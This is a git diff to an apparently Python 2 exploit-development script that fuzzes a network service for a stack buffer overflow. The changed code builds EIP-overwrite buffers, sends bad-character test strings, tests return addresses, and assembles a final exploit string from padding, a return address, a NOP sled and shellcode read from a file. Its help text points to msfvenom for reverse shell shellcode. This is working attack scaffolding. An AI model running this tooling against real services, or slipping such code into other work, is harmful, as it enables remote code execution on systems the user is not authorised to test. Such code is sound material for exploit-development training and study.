@@ -112,6 +112,8 @@ class FuzzLib(object):
 	def locate_bad_chars(b_location, **kwargs):
 		which_chars_to_remove = ""
 		char_string = ""
+		string_buffer = ""
+
 		chars_list = [
 			'\x00','\x01','\x02','\x03','\x04','\x05','\x06','\x07','\x08','\x09','\x0a','\x0b',
 			'\x0c','\x0d','\x0e','\x0f','\x10','\x11','\x12','\x13','\x14','\x15','\x16',
@@ -149,48 +151,53 @@ class FuzzLib(object):
 			for char in chars_to_remove:
 				chars_list.remove(char)
 
-		for char in chars_list:
-			char_string = char_string + char
+		if('custom_badchar_string' in kwargs):
+			cust_badchars = kwargs['custom_badchar_string'].decode('string-escape')
+			string_buffer = "A" * b_location + "B"*4 + "C" + cust_badchars + "C"
 
-		string_buffer = "A"*b_location + "B"*4 + char_string
+		else:
+			for char in chars_list:
+				char_string = char_string + char
+
+			string_buffer = "A" * b_location + "B"*4 + char_string
 
 		return str(string_buffer)
 
 	@staticmethod
 	def locate_space_4_shellcode(b_size, b_location, **kwargs):
-		first_stager = "C" * (b_size - b_location - 4)
+		stager_opcode = "C" * (b_size - b_location - 4)
 
 		if(kwargs['cust_stager'] != None):
-			first_stager = kwargs['cust_stager']
+			stager_opcode = kwargs['cust_stager']
 		
-		string_buffer = "A" * b_location + "B" * 4 + first_stager
+		string_buffer = "A" * b_location + "B" * 4 + stager_opcode
 
 		return str(string_buffer).decode('string-escape')
 
 	@staticmethod
 	def test_return_address(b_location, return_address, **kwargs):
-		first_stager = "C" * 390
+		stager_opcode = "C" * 390
 
 		if (kwargs['cust_stager'] != None):
-			first_stager = kwargs['cust_stager']
+			stager_opcode = kwargs['cust_stager']
 
-		string_buffer = "A" * b_location + return_address + first_stager
+		string_buffer = "A" * b_location + return_address + stager_opcode
 
 		return str(string_buffer).decode('string-escape')
 
 	@staticmethod
-	def generate_exploit_string(b_location, return_address, **kwargs):
+	def generate_exploit_string(**kwargs):
 		string_buffer = ""
 		clean_shellcode = ""
 		clean_custom_buffer = ""
 
-		if (kwargs['shellcode'] != None):
+		if ('shellcode' in kwargs):
 			with open(kwargs['shellcode']) as f:
 				for line in f:
 					clean_line = re.sub('[";]', '', line).strip()
 					clean_shellcode += clean_line
 
-			string_buffer = "A" * b_location + return_address + "\x90" * 8 + clean_shellcode
+			string_buffer = "A" * kwargs['b_location'] + kwargs['return_address'] + "\x90" * 8 + clean_shellcode
 
 		elif (kwargs['custom_exploit_buffer'] != None):
 			with open(kwargs['custom_exploit_buffer']) as f:
@@ -310,16 +317,23 @@ def main():
 			help='''location of the buffer offset that overwrote the EIP register after using the
 			--rand command to send a buffer. Use the --find-offset argument with the -s and the
 			-e argument.''')
-	parser.add_argument('--cust-stager', dest='custom_first_stager', type=str, metavar='<custom first stager>',
+	parser.add_argument('--custom-stager', dest='custom_stager', type=str, metavar='<custom stager>',
 			help='''custom first stager opcodes to execute in order to direct execution flow to final
 			shellcode location. Used only with --locate-space-4-shellcode and --find-return-addr.''')
 	parser.add_argument('--check-badchars', dest='check_badchars', action='store_true',
 			help='''send a list of ALL possible characters in hex (x00 to xff) to check 
 			what characters are bad and let us know what characters to not include in our buffer, 
-			return address or shell code. MUST use the -l argument''')
+			return address or shell code. MUST use the -l argument. NOTE: If the -b option is used
+			with this option only the custom bad chars will be sent & not ALL possible
+			characters.''')
+	parser.add_argument('-b', dest='custom_badchar_string', type=str, metavar='<custom badchar string>',
+			help='''send a custom list of chars to check if they get changed, dropped, mangled, 
+			or swapped once they are in memory. The string of chars MUST be in hex format in the 
+			following format (e.g. "\\x01\\x02\\x03").''')	
 	parser.add_argument('-r', dest='chars_to_remove', default='None', type=str, metavar='<chars to remove>',
-			help='''string of hex chars to remove from the hex list. The string of chars MUST
-			be in hex format and be separated by a comma (e.g. "\\x01,\\x02,\\x03").''')
+			help='''string of hex chars to remove from the "ALL possible character" hex list to assist in
+			the process of elimination. The string of chars MUST be in hex format and be separated 
+			by a comma (e.g. "\\x01,\\x02,\\x03").''')
 	parser.add_argument('--find-return-addr', dest='find_return_address', action='store_true',
 			help='''find a return address to divert execution to our shellcode. MUST use
 			the -l argument and the -a argument''')
@@ -329,15 +343,16 @@ def main():
 			script mona.py can be used to assist in finding an appropriate return address to use.
 			''')
 	parser.add_argument('--send-exploit', dest='send_exploit', action='store_true',
-			help='''test exploit and send shellcode. MUST use -l argument, -a argument and
-			-x argument.''')
+			help='''test exploit and send shellcode. MUST use --custom-exploit-buffer OR (-l argument, 
+			-a argument and -x argument).''')
 	parser.add_argument('-x', dest='shellcode', type=check_file_exists, 
 			metavar='<shellcode file>', help='''file containing shellcode string to use. Use a tool 
 			like msfvenom to automate the creation of reverse shell shellcode.''')
 	parser.add_argument('--custom-exploit-buffer', dest='custom_exploit_buffer', type=check_file_exists, 
 			metavar='<custom buffer file>', help='''file containing a custom exploit buffer string. This 
 			string should include all shellcode, stager code, return address & any padding in hexidecimal 
-			format. This option is only used with --send-exploit.''')
+			format. The padding characters can use regular ascii characters. This option is only used 
+			with --send-exploit.''')
 
 	args = parser.parse_args()
 	fuzz_l = FuzzLib()
@@ -399,10 +414,13 @@ def main():
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
 			else:
-				if args.chars_to_remove == 'None':
-					result = fuzz_l.locate_bad_chars(args.single_buff_location)
+				if args.custom_badchar_string != None:
+					result = fuzz_l.locate_bad_chars(args.single_buff_location, custom_badchar_string=args.custom_badchar_string)
 				else:
-					result = fuzz_l.locate_bad_chars(args.single_buff_location, bad_chars=args.chars_to_remove)
+					if args.chars_to_remove == 'None':
+						result = fuzz_l.locate_bad_chars(args.single_buff_location)
+					else:
+						result = fuzz_l.locate_bad_chars(args.single_buff_location, bad_chars=args.chars_to_remove)
 
 				send_buffer(conn, args.buffer_to_fuzz, result)
 
@@ -411,8 +429,8 @@ def main():
 				char_invalid_msg = '''use the -l argument to provide the location of the buffer offset that overwrote the EIP register after using the --rand command to send a buffer. Use the --find-offset argument with the -s and the -e argument to locate the specific offset value'''
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
-			elif args.custom_first_stager != None:
-				result = fuzz_l.locate_space_4_shellcode(args.buffer_size, args.single_buff_location, cust_stager=args.custom_first_stager)
+			elif args.custom_stager != None:
+				result = fuzz_l.locate_space_4_shellcode(args.buffer_size, args.single_buff_location, cust_stager=args.custom_stager)
 				send_buffer(conn, args.buffer_to_fuzz, result)
 			else:
 				result = fuzz_l.locate_space_4_shellcode(args.buffer_size, args.single_buff_location)
@@ -423,33 +441,38 @@ def main():
 				char_invalid_msg = '''Both the -l and -a arguments must be used. Use --help for usage information'''
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
-			elif args.custom_first_stager != None:
-				result = fuzz_l.test_return_address(args.single_buff_location, args.return_address, cust_stager=args.custom_first_stager)
+			elif args.custom_stager != None:
+				result = fuzz_l.test_return_address(args.single_buff_location, args.return_address, cust_stager=args.custom_stager)
 				send_buffer(conn, args.buffer_to_fuzz, result)
 			else:
 				result = fuzz_l.test_return_address(args.single_buff_location, args.return_address)
 				send_buffer(conn, args.buffer_to_fuzz, result)		
 
 		elif args.send_exploit:
-			if args.single_buff_location == 0 or args.return_address == 'None':
-				char_invalid_msg = '''Both the -l, -a and -x arguments must be used. Use --help for usage information'''
+			result = ""
+
+			if args.custom_exploit_buffer == None and (args.single_buff_location == 0 or args.return_address == 'None' or args.shellcode == None):
+				char_invalid_msg = '''MUST use --custom-exploit-buffer OR (-l argument, -a argument and -x argument). Use --help for usage information'''
 				raise argparse.ArgumentTypeError(char_invalid_msg)
 				return False
-			else:
-				result = ""
-				if (args.shellcode == None or args.custom_exploit_buffer == None) or (args.shellcode != None and args.custom_exploit_buffer != None):
-					char_invalid_msg = '''Must use -x OR --custom-exploit-buffer. --help for usage information'''
+			
+			elif args.custom_exploit_buffer != None and (args.single_buff_location != 0 or args.return_address != 'None' or args.shellcode != None):
+					char_invalid_msg = '''MUST use --custom-exploit-buffer OR (-l argument, -a argument and -x argument). Use --help for usage information'''
 					raise argparse.ArgumentTypeError(char_invalid_msg)
 					return False
+			else:
+				if args.custom_exploit_buffer != None:
+					result = fuzz_l.generate_exploit_string(custom_exploit_buffer=args.custom_exploit_buffer)
 				else:
-					if args.shellcode != None:
-						result = fuzz_l.generate_exploit_string(args.single_buff_location, 
-									args.return_address, shellcode=args.shellcode)
+					if args.single_buff_location == 0 or args.return_address == 'None':
+						char_invalid_msg = '''Both the -l, -a and -x arguments must be used. Use --help for usage information'''
+						raise argparse.ArgumentTypeError(char_invalid_msg)
+						return False
 					else:
-						result = fuzz_l.generate_exploit_string(args.single_buff_location, 
-									args.return_address, custom_exploit_buffer=args.custom_exploit_buffer)
+						result = fuzz_l.generate_exploit_string(b_location=args.single_buff_location, 
+									return_address=args.return_address, shellcode=args.shellcode)
 
-				send_buffer(conn, args.buffer_to_fuzz, result)
+			send_buffer(conn, args.buffer_to_fuzz, result)
 
 if __name__ == "__main__":
 	main()
